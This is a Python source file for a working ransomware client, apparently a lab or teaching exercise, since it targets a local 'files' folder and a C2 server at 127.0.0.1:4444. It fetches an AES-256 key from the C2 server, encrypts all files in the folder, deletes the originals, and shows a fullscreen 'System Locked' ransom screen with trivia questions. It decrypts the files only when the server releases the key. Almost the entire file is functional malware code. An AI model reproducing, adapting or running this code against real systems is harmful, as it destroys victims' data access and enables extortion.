import os
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import socket
import threading
import enum
import tkinter as tk
from tkinter import messagebox
import socket
from enum import Enum


class QuestionnaireGUI:
    def __init__(self, server_socket: socket):
        self.server_socket = server_socket

        self.questions = [
            "What is the capital of France?",
            "What is 2 + 2?",
            "Who is the best hacker in the world?"
        ]

        self.current_index = 0

        self.root = tk.Tk()
        self.root.title("System Locked")

        self.root.attributes("-fullscreen", True)
        self.root.configure(bg="black")

        # intro
        self.intro_frame = tk.Frame(self.root, bg="black")
        self.intro_frame.pack(expand=True)

        intro_text = (
            "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
            "To recover them, you must answer a set of questions.\n"
            "Answer all questions correctly to obtain the decryption key."
        )

        self.intro_label = tk.Label(
            self.intro_frame,
            text=intro_text,
            font=("Arial", 26),
            fg="white",
            bg="black",
            justify="center",
            wraplength=900
        )
        self.intro_label.pack(pady=40)

        self.start_button = tk.Button(
            self.intro_frame,
            text="Start",
            font=("Arial", 20),
            command=self.start_questions
        )
        self.start_button.pack(pady=20)

        # questions
        self.question_frame = tk.Frame(self.root, bg="black")

        self.label = tk.Label(
            self.question_frame,
            text="",
            font=("Arial", 24),
            fg="white",
            bg="black",
            wraplength=900
        )
        self.label.pack(pady=40)

        self.entry = tk.Entry(
            self.question_frame,
            font=("Arial", 20),
            width=40
        )
        self.entry.pack(pady=20)

        self.submit_btn = tk.Button(
            self.question_frame,
            text="Submit",
            font=("Arial", 18),
            command=self.submit_answer
        )
        self.submit_btn.pack(pady=20)

        self.status_label = tk.Label(
            self.question_frame,
            text="",
            font=("Arial", 16),
            fg="white",
            bg="black"
        )
        self.status_label.pack(pady=10)

        # enter key
        self.entry.bind("<Return>", lambda event: self.submit_answer())

        self.root.mainloop()

    # flow control
    def start_questions(self):
        self.intro_frame.pack_forget()
        self.question_frame.pack(expand=True)
        self.load_question()

    def load_question(self):
        if self.current_index < len(self.questions):
            self.label.config(text=self.questions[self.current_index])
            self.entry.delete(0, tk.END)
            self.status_label.config(text="")
        else:
            messagebox.showinfo("Success", "All questions completed!")
            self.root.destroy()

    def submit_answer(self):
        question = self.questions[self.current_index]
        answer = self.entry.get().strip()

        if not answer:
            return

        try:
            message = f"{Requests.CHECK_ANSWERS.value}:{question}:{answer}"
            self.server_socket.send(message.encode())

            response = self.server_socket.recv(1024).decode()

            if response.startswith("ANSWER_VERIFICATION:"):
                result = response.split(":", 1)[1]

                if result == "True":
                    self.status_label.config(text="Correct!", fg="lightgreen")
                    self.current_index += 1
                    self.load_question()
                else:
                    self.status_label.config(text="Incorrect. Try again.", fg="red")

        except Exception as e:
            messagebox.showerror("Error", str(e))
            self.root.destroy()

class Requests(enum.Enum):
    ENCRYPT = "ENCRYPT"
    CHECK_ANSWERS = "CHECK_ANSWERS"
    ANSWER_VERIFICATION = "ANSWER_VERIFICATION"
    REQUEST_DECRYPTION_KEY = "REQUEST_DECRYPTION_KEY"
    NOT_ENOUGH_CORRECT_ANSWERS = "NOT_ENOUGH_CORRECT_ANSWERS"
    EXIT = "EXIT"

def encrypt_folder(folder_path: str, key: bytes):
    """
    Encrypt all files in a folder using AES-256-GCM.
    Files are renamed with .enc extension.
    Skips files already ending in .enc
    """

    if len(key) != 32:
        raise ValueError("Key must be 32 bytes for AES-256")

    for root, _, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".enc"):
                continue  # skip already encrypted

            file_path = os.path.join(root, file)

            with open(file_path, "rb") as f:
                data = f.read()

            nonce = os.urandom(12)
            aesgcm = AESGCM(key)

            encrypted_data = aesgcm.encrypt(nonce, data, None)

            # save encrypted file
            enc_file_path = file_path + ".enc"

            with open(enc_file_path, "wb") as f:
                f.write(nonce + encrypted_data)

            # remove original file
            os.remove(file_path)

            print(f"Encrypted: {file_path} -> {enc_file_path}")

def decrypt_folder(folder_path: str, key: bytes):
    """
    Decrypt all .enc files in a folder using AES-256-GCM.
    Restores original filenames by removing .enc extension.
    Skips non-.enc files.
    """

    if len(key) != 32:
        raise ValueError("Key must be 32 bytes for AES-256")

    for root, _, files in os.walk(folder_path):
        for file in files:
            if not file.endswith(".enc"):
                continue  # only decrypt encrypted files

            file_path = os.path.join(root, file)

            with open(file_path, "rb") as f:
                file_data = f.read()

            nonce = file_data[:12]
            ciphertext = file_data[12:]

            aesgcm = AESGCM(key)

            try:
                decrypted_data = aesgcm.decrypt(nonce, ciphertext, None)
            except Exception:
                print(f"Failed to decrypt: {file_path}")
                continue

            # restore original filename (remove .enc)
            original_file_path = file_path[:-4]

            with open(original_file_path, "wb") as f:
                f.write(decrypted_data)

            # remove encrypted file
            os.remove(file_path)

            print(f"Decrypted: {file_path} -> {original_file_path}")


def validate_question(question: str, server_socket: socket):
    while True:
        answer = input(f"{question}\nYour answer: ")
        server_socket.send(f"{Requests.CHECK_ANSWERS.value}:{question}:{answer}".encode())
        response = server_socket.recv(1024).decode()
        if response.startswith("ANSWER_VERIFICATION:"):
            verification_result = response.split(":", 1)[1]
        if verification_result == "True":
            print("Correct answer! Let's go for the next question.")
            break
        else:
            print("Incorrect answer. Try again later.")

def questions(server_socket: socket):
    print("YOUR FILES HAVE BEEN ENCRYPTED!")
    print("Answer the following questions to get the decryption key:")
    
    validate_question("What is the capital of France?", server_socket)
    validate_question("What is 2 + 2?", server_socket)
    validate_question("Who is the best hacker in the world?", server_socket)

def handle_server_communication(server_socket: socket):
    """
    Handle communication with the C2 server.
    
    Args:
        client_socket: Socket connected to the C2 server
    """
    try:
        while True:
            server_socket.send(Requests.ENCRYPT.value.encode())
            response = server_socket.recv(1024).decode()
            if not response:
                print("C2 server disconnected.")
                break
            print(f"Received response from C2 server: {response}")
            
            k, s = response.split("::")

            decoded_key = base64.b64decode(k)
            salt = base64.b64decode(s)

            key = decoded_key
            if len(key) != 32:
                try:
                    maybe = base64.b64decode(key)
                    if len(maybe) == 32:
                        key = maybe
                except Exception:
                    pass

            print("Key:", key)
            print("Salt:", salt)

            base_files_dir = "files"
            encrypt_folder(str(base_files_dir), key)

            del key
            del salt
            #questions(server_socket)
            QuestionnaireGUI(server_socket)

            server_socket.send(Requests.REQUEST_DECRYPTION_KEY.value.encode())
            response = server_socket.recv(1024).decode()
            if response.startswith(Requests.NOT_ENOUGH_CORRECT_ANSWERS.value):
                print("Not enough correct answers to receive the decryption key, too bad :D")
            else:
                k, s = response.split("::")
                decoded_key = base64.b64decode(k)
                salt = base64.b64decode(s)

                key = decoded_key
                if len(key) != 32:
                    try:
                        maybe = base64.b64decode(key)
                        if len(maybe) == 32:
                            key = maybe
                    except Exception:
                        pass

                print(key)
                base_files_dir = "files"
                decrypt_folder(str(base_files_dir), key)
                break
    except Exception as e:
        print(f"Error communicating with C2 server: {str(e)}")
    finally:
        server_socket.close()
        print("Connection to C2 server closed.")

def connect_to_server(server_ip: str, server_port: int):
    """
    Connect to the C2 server and handle communication.
    
    Args:
        server_ip: IP address of the C2 server
        server_port: Port number of the C2 server
    """

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        server_socket.connect((server_ip, server_port))
        print(f"Connected to C2 server at {server_ip}:{server_port}")
        
        threading.Thread(target=handle_server_communication, args=(server_socket,)).start()
        
    except Exception as e:
        print(f"Failed to connect to C2 server: {str(e)}")
        server_socket.close()

if __name__ == "__main__":
    connect_to_server("127.0.0.1", 4444)